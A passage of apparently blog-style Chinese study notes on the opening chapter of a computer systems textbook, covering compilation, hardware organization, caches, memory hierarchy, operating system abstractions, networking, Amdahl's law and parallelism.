<li><strong>链接阶段</strong>。链接器（ld）将标准库函数单独预编译好的<code>.o</code>目标文件与上一阶段的<code>.o</code>程序合并，得到<strong>可执行目标文件（可执行文件）</strong>，可以被加载到内存中，由系统执行。</li>
</ul>
</li>
</ul>
<ol start="5">
<li><p>GNU（GNU’s Not Unix）项目的目标是开发出一个完整的类Unix系统，其源代码能够不受限制地被修改和传播。GNU项目已经开发出了一个包含Unix操作系统的所有主要部件的环境，但内核是由LInux项目独立发展而来的。</p>
</li>
<li><p>GNU环境包括EMACS编辑器、GCC编译器、GDB调试器、汇编器、链接器、处理二进制文件的工具以及其他一些部件。 </p>
</li>
<li><p>GCC编译器已经发展到支持许多不同的语言，能够为许多不同的机器生成代码。支持的语言包括C、C++、Fortran、Java、Pascal、面向对象 C 语言（Objective-C）和 Ada。</p>
</li>
</ol>
<h2 id="1-3-It-Pays-to-Understand-How-Compilation-Systems-Work"><a href="#1-3-It-Pays-to-Understand-How-Compilation-Systems-Work" class="headerlink" title="1.3 It Pays to Understand How Compilation Systems Work"></a>1.3 It Pays to Understand How Compilation Systems Work</h2><p>了解编译系统如何工作是大有益处的：</p>
<ul>
<li><strong>优化程序性能</strong>。对于不同的C语句，编译器将其转化为机器代码的方式也不同。比如，一个<code>switch</code>语句是否总是比一系列的<code>if-else</code>语句高效得多？一个函数调用的开销有多大？<code>while</code>循环比<code>for</code>循环更有效吗？指针引用比数组索引更有效吗？为什么将循环求和的结果放到一个本地变量中，会比将其放到一个通过引用传递过来的参数中，运行起来快很多呢？为什么我们只是简单地重新排列一下算术表达式中的括号就能让函数运行得更快？</li>
<li><strong>理解链接时出现的错误</strong>。一些最令人困扰的程序错误往往都与链接器操作有关，尤其是当你试图构建大型的软件系统时。比如，链接器报告说它无法解析一个引用，这是什么意思？静态变量和全局变量的区别是什么？如果你在不同的C文件中定义了名字相同的两个全局变量会发生什么？静态库和动态库的区别是什么？我们在命令行上排列库的顺序有什么影响？最严重的是，为什么有些链接错误直到运行时才会出现？</li>
<li><strong>避免安全漏洞</strong>。缓冲区溢出错误是造成大多数网络和Internet服务器上安全漏洞的主要原因。存在这些错误是因为很少有程序员能够理解需要限制从不受信任的源接收数据的数量和格式。学习安全编程的第一步就是理解数据和控制信息存储在程序栈上的方式会引起的后果。</li>
</ul>
<p>在第3章中，我们会了解到编译器是怎样把不同的C语言结构翻译成机器语言的。作为学习汇编语言的一部分，我们还将在第3章中描述堆栈原理和缓冲区溢出错误。我们还将学习程序员、编译器和操作系统可以用来降低攻击威胁的方法。在第5章中，将学习如何通过简单转换C语言代码，帮助编译器更好地完成工作，从而调整C程序的性能。在第6章中，将学习存储器系统的层次结构特性，C语言编译器如何将数组存放在内存中，以及C程序又是如何能够利用这些知识从而更高效地运行。</p>
<h2 id="1-4-Processors-Read-and-Interpret-Instructions-Stored-in-Memory"><a href="#1-4-Processors-Read-and-Interpret-Instructions-Stored-in-Memory" class="headerlink" title="1.4 Processors Read and Interpret Instructions Stored in Memory"></a>1.4 Processors Read and Interpret Instructions Stored in Memory</h2><p>处理器<strong>读</strong>并<strong>解释</strong>储存在内存中的指令。</p>
<p>当源程序已经被<a href="#CompilationSystem">编译系统</a>翻译成了可执行目标文件并存放在磁盘上后，要想在Unix系统上运行该可执行文件，应该将它的文件名输入到称为<code>shell</code>的应用程序中，例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./hello</span></span><br><span class="line">hello, world</span><br><span class="line"><span class="meta">linux&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>shell</code>是一个命令行解释器，它输出一个提示符，等待输入一个命令行，然后执行这个命令。如果该命令行的第一个单词不是一个内置的<code>shell</code>命令，那么<code>shell</code>就会假设这是一个可执行文件的名字，它将加载并运行这个文件。</p>
<h3 id="1-4-1-Hardware-Organization-of-a-System"><a href="#1-4-1-Hardware-Organization-of-a-System" class="headerlink" title="1.4.1 Hardware Organization of a System"></a>1.4.1 Hardware Organization of a System</h3><p> <span id = "hardware">系统的硬件组成</span>（CPU：中央处理单元；ALU：算数逻辑单元；PC：程序计数器；USB：通用串行总线）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%A1%AC%E4%BB%B6%E7%BB%84%E6%88%90.png" alt="硬件组成"></p>
<ol>
<li><p><strong>Buses</strong></p>
<p><strong>总线</strong>是贯穿整个系统的一组电子管道，携带信息字节并负责在各个部件间传递。</p>
<p>通常总线被设计成传送定长的字节块，也就是<strong>字（word）</strong>。字中的字节数（即<strong>字长</strong>）是一个基本的系统参数，各个系统中都不尽相同。现在的大多数机器字长要么是4个字节（32 位），要么是8个字节（64 位）。</p>
</li>
<li><p><strong>I/O Devices</strong></p>
<p><strong>输入/输出设备</strong>是系统与外部世界的联系通道。</p>
<p>I/O设备包括键盘、鼠标、显示器，以及用于长期存储数据和程序的磁盘驱动器（磁盘）。</p>
<p>每个I/O设备都通过一个<strong>控制器</strong>或<strong>适配器</strong>与I/O总线相连。</p>
<p>控制器和适配器之间的区别主要在于它们的封装方式——控制器是I/O设备本身或者系统的主印制电路板（<strong>主板</strong>）上的芯片组，而适配器则是一块插在主板插槽上的卡。它们的功能都是在I/O总线和I/O设备之间传递信息。</p>
</li>
<li><p><strong>Main Memory</strong></p>
<p><strong>主存</strong>是一个<strong>临时</strong>存储设备，在处理器执行程序时用来存放程序和程序处理的数据。</p>
<p>从物理上来说，主存是由一组<strong>动态随机存取存储器（DRAM）</strong>芯片组成的。</p>
<p>从逻辑上来说，存储器是一个线性的<strong>字节数组</strong>，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</p>
<p>一般来说，组成程序的每条机器指令都由不同数量的字节构成。与C程序变量相对应的数据项的大小是根据类型变化的。比如，在运行Linux的<code>X86-64</code>机器上，<code>short</code>类型的数据需要2个字节，<code>int</code>和<code>float</code>类型需要4个字节，而<code>long</code>和<code>double</code>类型需要8个宇节。</p>
</li>
<li><p><strong>Processor</strong></p>
<p><strong>中央处理单元（CPU）</strong>，简称<strong>处理器</strong>，是解释（<strong>执行，executes</strong>）存储在主存中指令的引擎。</p>
<p>处理器的核心是一个大小为一个字的存储设备（<strong>寄存器，register</strong>），称为<strong>程序计数器（PC）</strong>。PC时刻指向主存中的某条机器语言指令（地址）。</p>
<p>处理器是按照一个由<strong>指令集架构</strong>决定的<strong>指令执行模型</strong>来操作的，从系统通电开始，直到系统断电。在这个模型中，指令按照<strong>严格的顺序</strong>执行，而执行一条指令包含执行一系列的步骤。</p>
<p>处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新PC，使其指向下一条指令，而这条指令并不一定和在内存中刚刚执行的指令相邻。</p>
<p>指令指示的简单操作围绕着主存、<strong>寄存器文件（register file）</strong>和<strong>算术/逻辑单元（ALU）</strong>进行。寄存器文件是一个小的存储设备，由一些单个字长的寄存器组成，每个寄存器都有唯一的名字。ALU计算新的数据和地址值。指令指示的简单操作包括：</p>
<ul>
<li><strong>加载</strong>：从主存复制一个字节或者一个字到寄存器，以覆盖寄存器原来的内容。</li>
<li><strong>存储</strong>：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容。</li>
<li><strong>操作</strong>：把两个寄存器的内容复制到ALU，ALU对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容。</li>
<li><strong>跳转</strong>：从指令本身中抽取一个字，并将这个字复制到程序计数器（PC）中，以覆盖PC中原来的值。</li>
</ul>
<p>处理器并非只是它的指令集架构的简单实现，而且使用了非常复杂的机制来加速程序的执行。处理器的指令集架构描述的是每条机器代码指令的效果；而微体系结构描述的是处理器实际上是如何实现的。</p>
</li>
</ol>
<h3 id="1-4-2-Running-the-hello-Program"><a href="#1-4-2-Running-the-hello-Program" class="headerlink" title="1.4.2 Running the hello Program"></a>1.4.2 Running the hello Program</h3><p>通过了解<a href="#hardware">系统的硬件组成</a>和操作，下面介绍当运行<code>hello</code>程序时到底发生了些什么。</p>
<ol>
<li><p>初始时，我们向键盘上输入字符串“./hello”后，<code>shell</code>程序将字符逐一读入寄存器，再把它存放到内存中。如下图所示。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%AF%BB%E5%8F%96hello.png" alt="读取hello"></p>
</li>
<li><p>敲下回车键时，<code>shell</code> 程序知道我们已经结束了命令的输入，执行一系列指令来加载可执行的<code>hello</code>文件，将<code>hello</code>目标文件中的代码和数据从磁盘复制到主存。数据包括最终输出的字符串“<code>hello, world\n</code>”。</p>
<p>利用<strong>直接存储器存取（DMA）</strong>技术，数据可以不通过处理器而直接从磁盘到达主存。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png" alt="从磁盘加载可执行文件到主存"></p>
</li>
<li><p>目标文件<code>hello</code>中的代码和数据被加载到主存后，处理器开始执行<code>hello</code>程序的<code>main</code>程序中的机器语言指令。这些指令将“<code>hello, world\n</code>”字符串中的字节从主存复制到寄存器文件，再从寄存器文件复制到显示设备，最终显示在屏幕上。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%86%99%E5%88%B0%E6%98%BE%E7%A4%BA%E5%99%A8.png" alt="将输出字符串从存储器写到显示器"></p>
</li>
</ol>
<h2 id="1-5-Caches-Matter"><a href="#1-5-Caches-Matter" class="headerlink" title="1.5 Caches Matter"></a>1.5 Caches Matter</h2><ol>
<li><p>高速缓存至关重要。</p>
</li>
<li><p>上面的示例表明，系统花费了大量的时间把信息从一个地方挪到另一个地方：</p>
<ul>
<li><code>hello</code>程序的机器指令：磁盘-&gt;主存-&gt;处理器；</li>
<li>数据串“<code>hello, world\n</code>”：磁盘-&gt;主存-&gt;显示设备。</li>
</ul>
<p>这些复制就是开销，减慢了程序“真正”的工作。所以应该让这些复制操作尽快完成。</p>
</li>
<li><p>根据机械原理，较大的存储设备要比较小的存储设备运行得慢——处理器从寄存器文件中读数据比从主存中读数据几乎要快100倍，而且处理器与主存的这种差距还在持续增大。</p>
</li>
<li><p>针对处理器与主存之间的差异，一种更小更快的存储设备——<strong>高速缓存存储器（cache memory，cache/高速缓存）</strong>，可以作为暂时的集结区域，存放处理器近期可能会需要的信息。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E5%AD%98%E5%82%A8%E5%99%A8.png" alt="高速缓存存储器"></p>
</li>
<li><p>cache芯片上的<strong>L1高速缓存</strong>的容量可以达到数万字节，访问速度几乎和访问寄存器文件一样快。</p>
</li>
<li><p>一个容量为数十万到数百万字节的更大的 L2 高速缓存通过一条特殊的总线连接到处 理器。进程访问<strong>L2 高速缓存</strong>的时间要比访问L1高速缓存的时间长5倍，但是这仍然比访问主存的时间快5～10倍。</p>
</li>
<li><p>L1和L2高速缓存是用一种叫做<strong>静态随机访问存储器（SRAM）</strong> 的硬件技术实现的。系统可以获得一个很大的存储器，同时访问速度也很快，原因是利用了高速缓存的<strong>局部性</strong>原理，即程序具有访问局部区域里的数据和代码的趋势。通过让高速缓存里存放可能经常访问的数据，大部分的内存操作都能在快速的高速缓存中完成。</p>
</li>
<li><p>在处理器和一个较大较慢的设备（例如主存）之间插入一个更小更快的存储设备（例如高速缓存）的想法已经成为一个普遍的观念。正因如此，程序员利用高速缓存可以将程序的性能提高一个数量级。</p>
</li>
</ol>
<h2 id="1-6-Storage-Devices-Form-a-Hierarchy"><a href="#1-6-Storage-Devices-Form-a-Hierarchy" class="headerlink" title="1.6 Storage Devices Form a Hierarchy"></a>1.6 Storage Devices Form a Hierarchy</h2><p>存储设备形成层次结构：</p>
<p>其主要思想就是上一层的存储器作为低一层存储器的高速缓存。如下图所示。从上至下，设备的访问速度越来越慢、容量越来越大，每字节的造价也越来越便宜。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="一个存储器层次结构的示例"></p>
<p>程序员同样可以利用对整个存储器层次结构的理解来提高程序性能。</p>
<h2 id="1-7-The-Operating-System-Manages-the-Hardware"><a href="#1-7-The-Operating-System-Manages-the-Hardware" class="headerlink" title="1.7 The Operating System Manages the Hardware"></a>1.7 The Operating System Manages the Hardware</h2><p>操作系统管理硬件。</p>
<p>上面的<code>hello</code>程序运行过程中，<code>shell</code>和<code>hello</code>程序都没有直接访问键盘、显示器、磁盘或主存，而是依靠操作系统。</p>
<p>可以把操作系统看成是应用程序和硬件之间插入的一层软件，所有应用程序对硬件的操作尝试都必须通过操作系统。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%88%86%E5%B1%82.png" alt="计算机系统的分层视图"></p>
<p>操作系统有两个基本功能：</p>
<ul>
<li>防止硬件被失控的应用程序滥用；</li>
<li>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。</li>
</ul>
<p>操作系统通过几个基本的抽象概念（<strong>进程</strong>、<strong>虚拟内存</strong>、和<strong>文件</strong>）来实现这两个功能。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8A%BD%E8%B1%A1.png" alt="操作系统提供的抽象表示"></p>
<ul>
<li>文件是对I/O设备的抽象表示；</li>
<li>虚拟内存是对主存和磁盘I/O设备的抽象表示；</li>
<li>进程则是对处理器、主存和I/O设备的抽象表示。</li>
</ul>
<h3 id="1-7-1-Processes"><a href="#1-7-1-Processes" class="headerlink" title="1.7.1 Processes"></a>1.7.1 Processes</h3><ol>
<li><p><strong>进程</strong>是操作系统对一个正在运行的程序的一种抽象。在一个系统上可以同时运行多个进程，而每个进程都好像在独占地使用硬件。</p>
</li>
<li><p><strong>并发运行</strong>是指一个进程的指令和另一个进程的指令是交错执行的。</p>
</li>
<li><p>传统系统在一个时刻只能执行一个程序，而先进的<strong>多核</strong>处理器同时能够执行多个程序。</p>
</li>
<li><p>在大多数系统中，需要运行的进程数是多于可以运行它们的CPU个数的。无论是单核还是多核系统，一个CPU看上去在并发地执行多个进程，是通过处理器在进程间切换来实现的。</p>
<p>操作系统实现这种交错执行的机制称为<strong>上下文切换</strong>。</p>
</li>
<li><p>操作系统保持跟踪进程运行所需的所有状态信息，这种“状态”即<strong>上下文</strong>，包括许多信息——比如PC和寄存器文件的当前值。</p>
</li>
<li><p>当操作系统决定要把控制权从当前进程转移到某个新进程时，会保存当前进程的上下文、恢复新进程的上下文，然后将控制权传递到新进程，即进行<strong>上下文切换</strong>。新进程会从它上次停止的地方开始。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2.png" alt="进程的上下文切换"></p>
<p>当<code>hello</code>程序运行时，<code>Process A</code>为<code>shell</code>进程，<code>Process B</code>为<code>hello</code>进程。</p>
<ul>
<li>最开始只有<code>shell</code>进程在运行，等待命令行的输入。</li>
<li>当运行<code>hello</code>程序时，<code>shell</code>通过<strong>系统调用</strong>（一个专门的函数）来执行请求。系统调用会将控制权传递给操作系统。</li>
<li>操作系统保存<code>shell</code>进程的上下文，创建一个新的<code>hello</code>进程及其上下文，然后将控制权传给<code>hello</code>进程。</li>
<li><code>hello</code>进程终止后，操作系统恢复<code>shell</code>进程的上下文，传回控制权，<code>shell</code>进程继续等待下一个命令行输入。</li>
</ul>
</li>
<li><p>如上图所示，从一个进程到另一个进程的转换是由操作系统<strong>内核（kernel）</strong>管理的。内核是操作系统<strong>代码</strong>常驻内存的部分。</p>
</li>
<li><p>当应用程序需要操作系统的某些操作时，比如读写文件，它就执行一条特殊的<strong>系统调用（system call）</strong>指令，将控制权传递给内核。然后内核执行被请求的操作并返回应用程序。</p>
</li>
<li><p>注意，内核不是一个独立的进程。相反，它是系统管理全部进程所用<strong>代码</strong>和<strong>数据结构</strong>的集合。</p>
</li>
<li><p>实现进程这个抽象概念需要低级<strong>硬件</strong>和操作系统<strong>软件</strong>之间的紧密合作。</p>
</li>
</ol>
<h3 id="1-7-2-Threads"><a href="#1-7-2-Threads" class="headerlink" title="1.7.2 Threads"></a>1.7.2 Threads</h3><ol>
<li>一个进程并非只有单一的控制流，而是可以由多个称为<strong>线程</strong>的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和全局数据。</li>
<li>多线程之间比多进程之间更容易共享数据，线程一般来说都比进程更高效。</li>
<li>正因线程的优点，当有多处理器可用的时候，多线程也是一种使得程序可以运行得更快的方法。</li>
</ol>
<h3 id="1-7-3-Virtual-Memory"><a href="#1-7-3-Virtual-Memory" class="headerlink" title="1.7.3 Virtual Memory"></a>1.7.3 Virtual Memory</h3><ol>
<li><p><strong>虚拟内存</strong>是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。</p>
</li>
<li><p>每个进程看到的内存都是一致的，称为<strong>虚拟地址空间</strong>。如下图所示（为Linux进程的虚拟地址空间）。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="进程的虚拟地址空间"></p>
<p>在Linux中，地址空间最上面的区域是保留给<strong>操作系统</strong>中的代码和数据的，底部区域存放<strong>用户</strong>进程定义的代码和数据。</p>
<p>图中的地址是从下往上增大的。</p>
</li>
<li><p>每个进程看到的虚拟地址空间由大量准确定义的区构成，每个区都有专门的功能（从下往上）：</p>
<ul>
<li><strong>Program code and data（程序代码和数据）</strong>。对所有的进程来说，代码是从同一固定地址开始，紧接着的是和C全局变量相对应的数据位置。此区直接按照可执行目标文件的内容初始化。</li>
<li><strong>Heap（堆）</strong>。代码和数据区在进程一开始运行时就被指定了大小，但堆可以在运行时动态地扩展和收缩（当调用像<code>malloc</code>和<code>free</code>这样的C标准库函数时）。</li>
<li><strong>Shared libraries（共享库）</strong>。用来存放像C标准库和数学库这样的共享库的代码和数据的区域。</li>
<li><strong>Stack（栈）</strong>。编译器用栈来实现函数调用。和堆一样，用户栈在程序执行期间可以动态地扩展和收缩。</li>
<li><strong>Kernel virtual memory（内核虚拟内存）</strong>。地址空间顶部的区域是为内核保留的，不允许应用程序读写此区域的内容或直接调用内核代码定义的函数，而是必须调用内核来执行这些操作。</li>
</ul>
</li>
<li><p>虚拟内存的运作需要硬件和操作系统软件之间精密复杂的交互，包括对处理器生成的每个地址的硬件翻译。基本思想是把一个进程虚拟内存的内容存储在磁盘上，然后用主存作为磁盘的高速缓存。</p>
</li>
</ol>
<h3 id="1-7-4-Files"><a href="#1-7-4-Files" class="headerlink" title="1.7.4 Files"></a>1.7.4 Files</h3><ol>
<li><strong>文件</strong>就是字节序列，仅此而已。</li>
<li>每个I/O设备，包括磁盘、键盘、显示器，甚至网络，都可以看成文件。</li>
<li>系统中的所有输入输出都是通过使用一小组称为<strong>Unix I/O</strong>的系统函数调用读写文件来实现的。</li>
<li>文件向应用程序提供了一个统一的视图，来看待系统中可能含有的所有各式各样的I/O设备。同一个程序可以在使用不同磁盘技术的不同系统上运行。</li>
</ol>
<h2 id="1-8-Systems-Communicate-with-Other-Systems-Using-Networks"><a href="#1-8-Systems-Communicate-with-Other-Systems-Using-Networks" class="headerlink" title="1.8 Systems Communicate with Other Systems Using Networks"></a>1.8 Systems Communicate with Other Systems Using Networks</h2><ol>
<li><p>系统之间利用网络通信，而不是一个孤立的硬件和软件的集合体。</p>
</li>
<li><p>从一个单独的系统来看，网络可视为一个I/O设备。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%BB%9C%E4%B9%9F%E6%98%AF%E4%B8%80%E7%A7%8DI:O%E8%AE%BE%E5%A4%87.png" alt="网络也是一种I/O设备"></p>
<p>当系统从主存复制一串字节到网络适配器时，数据流经过网络到达另一台机器，而不是到达本地磁盘驱动器。</p>
<p>相似地，系统可以读取从其他机器发送来的数据，并把数据复制到自己的主存。</p>
</li>
<li><p>同样，可以使用<code>telnet</code>应用在一个远程主机上运行<code>hello</code>程序——用本地主机<code>telnet</code>客户端连接远程主机<code>telnet</code>服务器。如下图所示。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%BF%9C%E7%A8%8B%E8%BF%90%E8%A1%8Chello.png" alt="利用telnet通过网络远程运行hello"></p>
</li>
</ol>
<h2 id="1-9-Important-Themes"><a href="#1-9-Important-Themes" class="headerlink" title="1.9 Important Themes"></a>1.9 Important Themes</h2><p>系统不仅仅只是硬件，而是硬件和系统软件互相交织的集合体，它们必须共同协作以达到运行应用程序的最终目的。</p>
<p>下面是一些重要概念。</p>
<h3 id="1-9-1-Amdahl’s-Law"><a href="#1-9-1-Amdahl’s-Law" class="headerlink" title="1.9.1 Amdahl’s Law"></a>1.9.1 Amdahl’s Law</h3><ol>
<li><strong>Amdahl定律</strong>是Gene Amdahl（计算领域早期先锋之一）对提升系统某一部分性能所带来的效果做出的简单却有见地的观察。</li>
<li>主要思想：当我们对系统的某个部分加速时，其对系统整体性能的影响取决于该部分的重要性和加速程度。</li>
<li>设系统执行某应用程序原来需要的时间为$t$，系统某部分所需执行时间为$\alpha t$，该部分性能提升比例为$k$，即该部分现在所需时间为$(\alpha t)/k$。因此，总的执行时间应为$$T=(1-\alpha)t+(\alpha t)/k=t[(1-\alpha)+\alpha/k]$$由此，可以计算加速比$S=t/T$为$$S=\frac{1}{(1-\alpha)+\alpha/k}$$</li>
<li>从公式中可以看出，即使对系统的一个主要部分（$\alpha$很大）做出了总大改进，但获得的系统加速比$S$却明显小于这部分的加速比$k$。这就是Amdahl定律的主要观点——要想显著加速整个系统，必须提升全系统中相当大的部分的速度。</li>
<li>性能提升最好的表示方法就是用比例的形式$S=t/T$，其中$t$是原始系统所需的时间，$T$是修改后的系统所需时间，这种表示法比百分比更易理解。</li>
<li>当$k$趋向于∞时，意味着加速到不花时间的程度，得到$$S_{∞}=\frac{1}{(1-\alpha)}$$</li>
</ol>
<h3 id="1-9-2-Concurrency-and-Parallelism"><a href="#1-9-2-Concurrency-and-Parallelism" class="headerlink" title="1.9.2 Concurrency and Parallelism"></a>1.9.2 Concurrency and Parallelism</h3><ol>
<li>我们想要计算机做得更多并且更快，这是驱动进步的持续动力。当处理器能够<strong>同时</strong>做<strong>更多</strong>的事情时，这两个因素都会改进。</li>
<li><strong>并发（concurrency）</strong>指一个同时具有多个活动的系统；<strong>并行（Parallelism）</strong>指的是用并发来使一个系统运行得更快。</li>
<li>并行可以在计算机系统的多个抽象层次上运用：<ul>
<li><strong>线程级并发</strong><ol>
<li>构建在进程之上，设计出同时执行多个程序的系统，这就导致了<strong>并发</strong>。</li>
<li>使用线程，可以在一个进程中执行多个控制流。</li>
<li>这种并发执行只是<strong>模拟</strong>出来的，是通过使一台计算机在它正在执行的进程间<strong>快速切换</strong>来实现的。</li>
<li>这种并发形式允许多个用户同时与系统交互，也允许一个用户同时从事多个任务。</li>
<li>在以前，即使处理器必须在多个任务间切换，大多数实际的计算也都是由<strong>一个</strong>处理器来完成的。这种配置称为<strong>单处理器系统</strong>。</li>
<li>由单操作系统内核控制的多处理器组成的系统，称为<strong>多处理器系统</strong>。不同的处理器类型可以分类如下。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%A4%84%E7%90%86%E5%99%A8%E9%85%8D%E7%BD%AE.png" alt="不同的处理器类型分类"></li>
<li>多核处理器是将多个核（CPU）集成到一个集成电路芯片上，如下图所示。图中微处理器芯片有4个CPU核，每个核都有自己的L1和L2高速缓存，其中L1高速缓存分为两个部分——一个保存最近取到的指令，另一个存放数据。这些核共享更高层次的高速缓存，以及到主存的接口。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%A4%9A%E6%A0%B8%E5%A4%84%E7%90%86%E5%99%A8%E7%9A%84%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84.png" alt="多核处理器的组织结构"></li>
<li><strong>超线程</strong>，也称<strong>同时多线程（simultaneous multi-threading）</strong>，是一项允许一个CPU执行多个控制流的技术。</li>
<li>常规的处理器需要大约20 000个时钟周期做不同线程间的转换，而超线程的处理器可以在单个周期的基础上决定要执行哪一个线程。这使得CPU能够更好地利用它的处理资源。</li>
<li>假设一个线程必须等到某些数据被装载到高速缓存中，那CPU就可以继续去执行另一个线程。举例来说，Intel Core i7处理器可以让每个核执行两个线程，所以一个4核的系统实际上可以并行地执行8个线程。</li>
<li>CPU某些硬件有多个备份，比如程序计数器和寄存器 件，而其他的硬件部分只有一份，比如执行浮点算术运算的单元。</li>
<li>多处理器的使用减少了在执行多个任务时模拟并发的需要，同时可以使应用程序运行得更快（必须要求程序是以多线程方式来书写的，这些线程可以并行地高效执行），从而提高系统性能。</li>
</ol>
</li>
<li><strong>指令级并行</strong><ol>
<li>在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称为<strong>指令级并行</strong>。</li>
<li>处理器可以保持每个时钟周期2～4条指令的执行速率，但每条指令从开始到结束需要更长的时间（大约20个或者更多周期）。</li>
<li>处理器使用了非常多的聪明的技巧来同时处理多达100条指令。在<strong>流水线（pipelining）</strong>中，将执行一条指令所需要的活动划分成不同的步骤、将处理器的硬件组织成一系列的阶段，每个阶段执行一个步骤，这些阶段可以并行地操作，用来处理不同指令的不同部分。</li>
<li>如果处理器可以达到比一个时钟周期一条指令更快的执行速率，就称之为<strong>超标量（superscalar）</strong>处理器。</li>
</ol>
</li>
<li><strong>单指令、多数据并行</strong><ol>
<li>一条指令产生多个可以并行执行的操作，称为<strong>单指令、多数据</strong>，即SIMD并行。</li>
<li>提供这些SIMD指令多是为了提高处理影像、声音和视频数据应用的执行速度。</li>
<li>虽然有些编译器会试图从C程序中自动抽取SIMD并行性，但是更可靠的方法是用编译器支持的特殊的向量数据类型来写程序，比如GCC就支持向量数据类型。</li>
</ol>
</li>
</ul>
</li>
</ol>
<h3 id="1-9-3-The-Importance-of-Abstractions-in-Computer-Systems"><a href="#1-9-3-The-Importance-of-Abstractions-in-Computer-Systems" class="headerlink" title="1.9.3 The Importance of Abstractions in Computer Systems"></a>1.9.3 The Importance of Abstractions in Computer Systems</h3><p>计算机系统中抽象的重要性：</p>
<ol>
<li><p><strong>抽象</strong>的使用是计算机科学中最为重要的概念之一。</p>
</li>
<li><p>为一组函数规定一个简单的应用程序接口（API）就是一种抽象，程序员无需了解它内部的工作便可以使用这些代码。</p>
</li>
<li><p>如下图所示，在处理器里，<strong>指令集架构</strong>提供了对实际处理器硬件的抽象。<img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%8A%BD%E8%B1%A1.png" alt="计算机系统抽象"></p>
<p>计算机系统中的一个重大主题就是提供不同层次的抽象表示，来隐藏实际实现的复杂性。使用这个抽象，机器代码程序表现得就好像运行在一个一次只执行一条指令的处理器上。</p>
</li>
<li><p>底层的硬件远比抽象描述的要复杂精细，它并行地执行多条指令，但又总是与那个简单有序的模型保持一致。只要执行模型一样，不同的处理器实现也能执行同样的机器代码，而又提供不同的开销和性能。</p>
</li>
<li><p>操作系统有几个抽象：</p>
<ul>
<li><strong>文件</strong>是对I/O设备的抽象；</li>
<li><strong>虚拟内存</strong>是对程序存储器的抽象；</li>
<li><strong>进程</strong>是对一个正在运行的程序的抽象；</li>
<li><strong>虚拟机</strong>提供对整个计算机的抽象，包括操作系统、处理器和程序。（虚拟机的思想是IBM在20世纪60年代提出来的）</li>
</ul>
</li>
</ol>
<h2 id="1-10-Summary"><a href="#1-10-Summary" class="headerlink" title="1.10 Summary"></a>1.10 Summary</h2><p>计算机系统是由<strong>硬件</strong>和<strong>系统软件</strong>组成的，它们共同协作以运行应用程序。计算机内部的信息被表示为一组组的<strong>位</strong>，它们依据<strong>上下文</strong>有不同的解释方式。程序被其他程序翻译成不同的形式，开始时是<strong>ASCII文本</strong>，然后被编译器和链接器翻译成<strong>二进制可执行文件</strong>。</p>
<p><strong>处理器</strong>读取并解释存放在<strong>主存</strong>里的二进制指令。因为计算机花费了大量的时间在内存、I/O设备和CPU寄存器之间复制数据，所以将系统中的存储设备划分成层次结构——<strong>CPU寄存器</strong>在顶部，接着是多层的<strong>硬件高速缓存存储器</strong>、<strong>DRAM主存</strong>和<strong>磁盘存储器</strong>。在层次模型中，位于更高层的存储设备比低层的存储设备要<strong>更快</strong>，单位比特造价也<strong>更高</strong>。层次结构中较高层次的存储设备可以作为较低层次设备的<strong>高速缓存</strong>。通过理解和运用这种存储层次结构的知识，程序员可以优化C程序的性能。</p>
<p><strong>操作系统内核</strong>是应用程序和硬件之间的媒介。它提供三个基本的抽象：文件是对<strong>I/O设备</strong>的抽象；虚拟内存是对<strong>主存</strong>和<strong>磁盘</strong>的抽象；进程是<strong>处理器</strong>、<strong>主存</strong>和<strong>I/O设备</strong>的抽象。</p>
<p>最后，<strong>网络</strong>提供了计算机系统之间通信的手段。从特殊系统的角度来看，网络就是一种<strong>I/O设备</strong>。</p>
<h1 id="Part-I-Program-Structure-and-Execution"><a href="#Part-I-Program-Structure-and-Execution" class="headerlink" title="Part I: Program Structure and Execution"></a><em>Part I: Program Structure and Execution</em></h1><p>第一部分：程序<strong>结构</strong>和<strong>执行</strong>。</p>
<p>我们对计算机系统的探索是从学习计算机本身开始的，它由<strong>处理器</strong>和<strong>存储器子系统</strong>组成。</p>
